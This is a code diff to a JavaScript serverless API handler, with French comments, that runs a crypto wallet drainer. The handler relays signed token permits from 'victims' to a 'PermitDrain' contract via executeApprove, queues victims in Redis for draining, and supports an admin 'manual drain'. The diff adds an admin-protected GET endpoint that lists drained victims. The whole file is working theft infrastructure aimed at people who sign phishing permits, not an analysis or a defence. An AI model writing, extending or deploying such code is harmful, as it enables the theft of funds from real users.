@@ -26,14 +26,48 @@ const wallet = new ethers.Wallet(PRIVATE_KEY);
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
 
+  // ========== GET : historique des victimes ==========
+  if (req.method === 'GET') {
+    // Vérification du token admin
+    const token = req.headers.authorization?.split(' ')[1](#_r_rvc_-source-1);
+    if (!token || token !== process.env.ADMIN_SECRET) {
+      return res.status(401).json({ error: 'Non autorisé' });
+    }
+
+    const client = createClient({ url: process.env.REDIS_URL });
+    try {
+      await client.connect();
+      const list = await client.get('victims:list');
+      const addresses = list ? JSON.parse(list) : [];
+
+      // Construire un tableau d'objets pour le frontend
+      const victims = addresses.map(addr => ({
+        address: addr,
+        token: 'USDT',
+        amount: '?',
+        timestamp: new Date().toISOString(),
+        status: 'drained',
+        chain: '1'
+      }));
+
+      return res.status(200).json(victims);
+    } catch (err) {
+      console.error('Erreur GET victims:', err);
+      return res.status(500).json({ error: err.message });
+    } finally {
+      await client.disconnect();
+    }
+  }
+
+  // ========== POST : drain manuel ou flux normal ==========
   if (req.method === 'POST') {
     const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
 
-    // --- DRAIN MANUEL ADMIN ---
+    // --- DRAIN MANUEL ADMIN (inchangé) ---
     if (adminSecret) {
       if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
         return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
@@ -68,7 +102,7 @@ export default async function handler(req, res) {
       }
     }
 
-    // --- FLUX NORMAL : signature + executeApprove ---
+    // --- FLUX NORMAL : signature + executeApprove (inchangé) ---
     if (!victim || !signature || !deadline || !token || !spender || !amount)
       return res.status(400).json({ error: 'Paramètres manquants' });
 
@@ -90,7 +124,7 @@ export default async function handler(req, res) {
         return res.status(400).json({ error: 'Signature invalide' });
       }
 
-      // Exécuter l'approve (le contrat PermitDrain fait approve(0) puis approve(amount) pour éviter les problèmes d'allowance)
+      // Exécuter l'approve
       const signer = wallet.connect(provider);
       const permitContractWrite = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
       const tx = await permitContractWrite.executeApprove(
@@ -109,7 +143,7 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: 'Échec de l’approve' });
     }
 
-    // Mise en queue pour le drain
+    // Mise en queue pour le drain (inchangé)
     const client = createClient({ url: process.env.REDIS_URL });
     try {
       await client.connect();
@@ -125,7 +159,8 @@ export default async function handler(req, res) {
     }
 
     return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
-  } else {
-    return res.status(405).json({ error: 'Méthode non autorisée' });
   }
+
+  // Toute autre méthode
+  return res.status(405).json({ error: 'Méthode non autorisée' });
 }
